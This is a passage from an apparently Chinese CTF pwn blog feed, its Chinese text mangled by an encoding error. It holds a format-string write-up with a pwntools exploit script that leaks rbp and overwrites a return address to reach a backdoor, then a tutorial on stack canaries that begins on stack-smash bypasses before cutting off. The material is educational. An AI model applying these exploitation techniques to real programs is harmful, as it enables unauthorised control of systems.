src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-0.png"></p><p>å‘ç°ç¨‹åºå­˜åœ¨åé—¨ï¼š</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-4.png"></p><p>æ€è·¯ï¼šä¿®æ”¹è¿”å›åœ°å€åˆ°åé—¨å‡½æ•°å¤„</p><ul><li>æ³„æ¼showå‡½æ•°çš„å­˜å‚¨è¿”å›åœ°å€çš„æ ˆåœ°å€</li><li>ä¿®æ”¹è¿”å›åœ°å€ä¸º0x4008AA</li></ul><p>åŠ¨æ€è°ƒè¯•ï¼ŒæŠŠæ–­ç‚¹ä¸‹åœ¨è¾“å‡ºå¯†ç çš„printfå¤„ï¼Œè´¦å·è¾“å…¥AAAAAAAA,å¯†ç è¾“å…¥BBBBBBBB</p><ul><li>å¯ä»¥çœ‹åˆ°å‡½æ•°è¿”å›åœ°å€å­˜å‚¨åœ¨0x7fffffffdd38å¤„ï¼Œè€Œrbpï¼ˆä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ï¼‰é‡Œé¢å­˜å‚¨çš„æ˜¯æ ˆåœ°å€0x7fffffffdd70ï¼Œè™½ç„¶æ ˆçš„åœ°å€æ˜¯å˜åŒ–çš„ï¼Œä½†æ˜¯ä¸¤è€…çš„åç§»æ˜¯ä¸å˜çš„ã€‚<ul><li>0x7fffffffdd70 - 0x7fffffffdd38 = 0x38</li></ul></li><li>è´¦å·å­˜å‚¨åœ¨0x7fffffffdd40ï¼Œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬8ä¸ªå‚æ•°</li><li>å¯†ç (æ ¼å¼åŒ–å­—ç¬¦ä¸²)åœ¨ç¬¬10ä¸ªåç§»å¤„</li></ul><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆç”¨<code>%6$p</code>æ³„æ¼å¤„rbpï¼Œç„¶ååˆ©ç”¨<code>rbp-0x38</code>è®¡ç®—å‡ºå­˜å‚¨è¿”å›åœ°å€çš„ä½ç½®ret_addrï¼Œç„¶åä¿®æ”¹è´¦å·ä¸º<code>rer_addr</code>ï¼Œå¯†ç ä¸º<code>'%2218c' + '%8$hn'</code>ï¼Œç„¶åshowå³å¯</p><ul><li>å¯ä»¥çœ‹åˆ°è¿”å›åœ°å€ä¸º0x400d74ï¼Œsystem_addr = 0x4008AA ==&gt; 0x40éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†™å…¥ä¸¤ä¸ªå­—èŠ‚å³å†™å…¥<code>08AA</code> ==&gt; 2218</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-3.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwnme_k0"</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4008AA</span>payload <span class="token operator">=</span> <span class="token string">'%6$p'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'XiaozaYa\n'</span><span class="token punctuation">)</span>rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x38</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%2218c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryæ”»å‡»åŸç†ç¯‡</title>
      <link href="/2023/04/09/canary/"/>
      <url>/2023/04/09/canary/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Canaryä»‹ç»"><a href="#Canaryä»‹ç»" class="headerlink" title="Canaryä»‹ç»"></a>Canaryä»‹ç»</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œé€šå¸¸æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æº¢å‡ºå­˜åœ¨äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œä»è€Œè®©å¤šå‡ºæ¥çš„æ•°æ®è¦†ç›– ebpã€eip ç­‰ï¼Œä»è€Œè¾¾åˆ°åŠ«æŒæ§åˆ¶æµçš„ç›®çš„ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®© shellcode èƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆåº•æ’å…¥ cookie ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³• (æ ˆå¸§é”€æ¯å‰æµ‹è¯•è¯¥å€¼æ˜¯å¦è¢«æ”¹å˜)ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œ (æ ˆæº¢å‡ºå‘ç”Ÿ)ã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°† cookie ä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢ shellcode çš„æ‰§è¡Œï¼Œé¿å…æ¼æ´åˆ©ç”¨æˆåŠŸã€‚åœ¨ Linux ä¸­æˆ‘ä»¬å°† cookie ä¿¡æ¯ç§°ä¸º Canaryã€‚</p><p>ç”±äº stack overflow è€Œå¼•å‘çš„æ”»å‡»éå¸¸æ™®éä¹Ÿéå¸¸å¤è€ï¼Œç›¸åº”åœ°ä¸€ç§å«åš Canary çš„ mitigation æŠ€æœ¯å¾ˆæ—©å°±å‡ºç°åœ¨ glibc é‡Œï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä½œä¸ºç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿å­˜åœ¨ã€‚</p><p>Canary ä¸ç®¡æ˜¯å®ç°è¿˜æ˜¯è®¾è®¡æ€æƒ³éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œ<strong>å°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼åœ¨ stack overflow å‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨ã€‚å½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹ Canary çš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ stack/buffer overflow æ˜¯å¦å‘ç”Ÿã€‚</strong></p><p>Canary ä¸ Windows ä¸‹çš„ GS ä¿æŠ¤éƒ½æ˜¯ç¼“è§£æ ˆæº¢å‡ºæ”»å‡»çš„æœ‰æ•ˆæ‰‹æ®µï¼Œå®ƒçš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šå¢åŠ äº†æ ˆæº¢å‡ºæ”»å‡»çš„éš¾åº¦ï¼Œå¹¶ä¸”ç”±äºå®ƒå‡ ä¹å¹¶ä¸æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥ç°åœ¨æˆäº† Linux ä¸‹ä¿æŠ¤æœºåˆ¶çš„æ ‡é…ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å¯ä»¥åœ¨ GCC ä¸­ä½¿ç”¨ä»¥ä¸‹å‚æ•°è®¾ç½® Canary:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">-</span>fstack<span class="token operator">-</span>protector å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰å­—ç¬¦æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>all å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>strong<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>explicit åªå¯¹æœ‰æ˜ç¡® stack_protect attribute çš„å‡½æ•°å¼€å¯ä¿æŠ¤<span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector ç¦ç”¨ä¿æŠ¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€å¯ Canary ä¿æŠ¤çš„ stack ç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">       High Address   <span class="token operator">|</span>                 <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> args            <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>       rbp <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     rbp<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> local variables <span class="token operator">|</span>Low Address    <span class="token operator">|</span>                 <span class="token operator">|</span>       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wikiï¼šï¼‰x64ç¨‹åº</p><blockquote><p>32ä½æ˜¯å–gså¯„å­˜å™¨çš„å€¼æ”¾åœ¨rbp-4å¤„</p></blockquote><p>å½“ç¨‹åºå¯ç”¨ Canary ç¼–è¯‘åï¼Œåœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå–<strong>fs å¯„å­˜å™¨ 0x28 å¤„çš„å€¼</strong>ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ rbp-0x8 çš„ä½ç½®ã€‚ è¿™ä¸ªæ“ä½œå³ä¸ºå‘æ ˆä¸­æ’å…¥ Canary å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rax, qword ptr fs:[0x28] ;å–fs:[0x28]çš„å€¼ç»™raxmov    qword ptr [rbp - 8], rax ;æŠŠraxçš„å€¼ç»™rbp-8çš„ä½ç½®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œä¼šå°†è¯¥å€¼å–å‡ºï¼Œå¹¶ä¸ fs:0x28 çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¦‚æœå¼‚æˆ–çš„ç»“æœä¸º 0ï¼Œè¯´æ˜ Canary æœªè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¼šæ­£å¸¸è¿”å›ï¼Œè¿™ä¸ªæ“ä½œå³ä¸ºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡ºã€‚</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœ Canary å·²ç»è¢«éæ³•ä¿®æ”¹ï¼Œæ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ° <code>__stack_chk_fail</code>ã€‚<code>__stack_chk_fail</code> ä¹Ÿæ˜¯ä½äº glibc ä¸­çš„å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ ELF çš„å»¶è¿Ÿç»‘å®šï¼Œå®šä¹‰å¦‚ä¸‹ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eglibc<span class="token operator">-</span><span class="token number">2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ„å‘³å¯ä»¥é€šè¿‡åŠ«æŒ <code>__stack_chk_fail</code> çš„ got å€¼åŠ«æŒæµç¨‹æˆ–è€…åˆ©ç”¨ <code>__stack_chk_fail</code> æ³„æ¼å†…å®¹ (å‚è§ ä¸‹æ–‡stack smash)ã€‚</p><p>è¿›ä¸€æ­¥ï¼Œå¯¹äº Linux æ¥è¯´ï¼Œ<strong>fs å¯„å­˜å™¨å®é™…æŒ‡å‘çš„æ˜¯å½“å‰æ ˆçš„ TLS ç»“æ„</strong>ï¼Œfs:0x28 æŒ‡å‘çš„æ­£æ˜¯ stack_guardã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¦‚æœå­˜åœ¨æº¢å‡ºå¯ä»¥è¦†ç›–ä½äº TLS ä¸­ä¿å­˜çš„ Canary å€¼é‚£ä¹ˆå°±å¯ä»¥å®ç°ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚</strong></p><p>äº‹å®ä¸Šï¼ŒTLS ä¸­çš„å€¼ç”±å‡½æ•° security_init è¿›è¡Œåˆå§‹åŒ–ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// _dl_randomçš„å€¼åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ—¶å€™å°±å·²ç»ç”±kernelå†™å…¥.</span>  <span class="token comment">// glibcç›´æ¥ä½¿ç”¨äº†_dl_randomçš„å€¼å¹¶æ²¡æœ‰ç»™èµ‹å€¼</span>  <span class="token comment">// å¦‚æœä¸é‡‡ç”¨è¿™ç§æ¨¡å¼, glibcä¹Ÿå¯ä»¥è‡ªå·±äº§ç”Ÿéšæœºæ•°</span>  <span class="token comment">//å°†_dl_randomçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x0</span>  <span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è®¾ç½®Canaryçš„å€¼åˆ°TLSä¸­</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//THREAD_SET_STACK_GUARDå®ç”¨äºè®¾ç½®TLS</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">THREAD_SET_STACK_GUARD</span><span class="token expression"><span class="token punctuation">(</span>value<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token function">THREAD_SETMEM</span> <span class="token punctuation">(</span>THREAD_SELF<span class="token punctuation">,</span> header<span class="token punctuation">.</span>stack_guard<span class="token punctuation">,</span> value<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ä»£ç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -fstack-protector-all -o test test.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func1 int a = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"func2"</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func2 char s[10] = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello  world"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func3 char *s = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹func1å‡½æ•°æ±‡ç¼–ä»£ç ï¼š</p><ul><li>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨func1å‡½æ•°å¼€å§‹æ—¶ï¼Œä¼šæŠŠfs:[0x28]çš„å€¼æ”¾åœ¨rbp-8å¤„</li><li>func1å‡½æ•°è¿”å›æ—¶ï¼Œä¼šæ£€æŸ¥rbp-8å¤„çš„å€¼ä¸fs:[0x28]çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼ˆfunc2,func3ç±»ä¼¼</li></ul><p><img src="/2023/04/09/canary/2.png"></p><p><img src="/2023/04/09/canary/1.png"></p><p>å½“å‘ç”Ÿæ ˆæº¢å‡ºæ—¶ï¼š</p><p><img src="/2023/04/09/canary/3.png"></p><h1 id="Canaryç»•è¿‡ä¸åˆ©ç”¨"><a href="#Canaryç»•è¿‡ä¸åˆ©ç”¨" class="headerlink" title="Canaryç»•è¿‡ä¸åˆ©ç”¨"></a>Canaryç»•è¿‡ä¸åˆ©ç”¨</h1><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ç¨‹åºåŠ äº† canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬è¯»å–çš„ buffer è¦†ç›–äº†å¯¹åº”çš„å€¼æ—¶ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œè€Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¹¶ä¸ä¼šå…³å¿ƒæŠ¥é”™ä¿¡æ¯ã€‚è€Œ stack smash æŠ€å·§åˆ™å°±æ˜¯åˆ©ç”¨æ‰“å°è¿™ä¸€ä¿¡æ¯çš„ç¨‹åºæ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºå¯åŠ¨ canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç° canary è¢«ä¿®æ”¹çš„è¯ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <code>__stack_chk_fail</code> å‡½æ•°æ¥æ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ç¨‹åºåã€‚</p><p><strong>æ‰€ä»¥è¯´å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– argv[0] ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨ <code>__fortify_fail</code> å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚ï¼ˆç›¸å…³__stack_chk_failç­‰å‡½æ•°è§ä¸Šæ–‡</strong></p><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h4><p>ç¨‹åºå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤</p><p><img src="/2023/04/09/canary/2-1.png"></p><p>ç¨‹åºé€»è¾‘ï¼š</p><ul><li>è¯¥é¢˜ä¸ºè¯»flagé¢˜ï¼Œflagå­˜å‚¨åœ¨byte_600D20æ•°ç»„ä¸­</li><li>é¦–å…ˆè¾“å…¥nameï¼Œè¿™é‡Œä½¿ç”¨_IO_getså‡½æ•°ï¼Œå­˜åœ¨æº¢å‡º</li><li>ç„¶åè®©æˆ‘ä»¬è¾“å…¥flagï¼Œæˆ‘ä»¬è¾“å…¥çš„flagä¼šæŠŠbyte_600D20æ•°ç»„ä¸­çš„å€¼ç»™è¦†ç›–æ‰ï¼Œå¯¹äºæˆ‘ä»¬æ²¡æœ‰è¦†ç›–çš„byte_600D20ä¸­çš„å€¼ï¼Œç¨‹åºä¼šç›´æ¥æŠŠå…¶è¦†å†™ä¸º0</li></ul><p><img src="/2023/04/09/canary/2-2.png"></p><p>æ€è·¯ï¼š</p><blockquote><ul><li><strong>åœ¨ ELF å†…å­˜æ˜ å°„æ—¶ï¼Œbss æ®µä¼šè¢«æ˜ 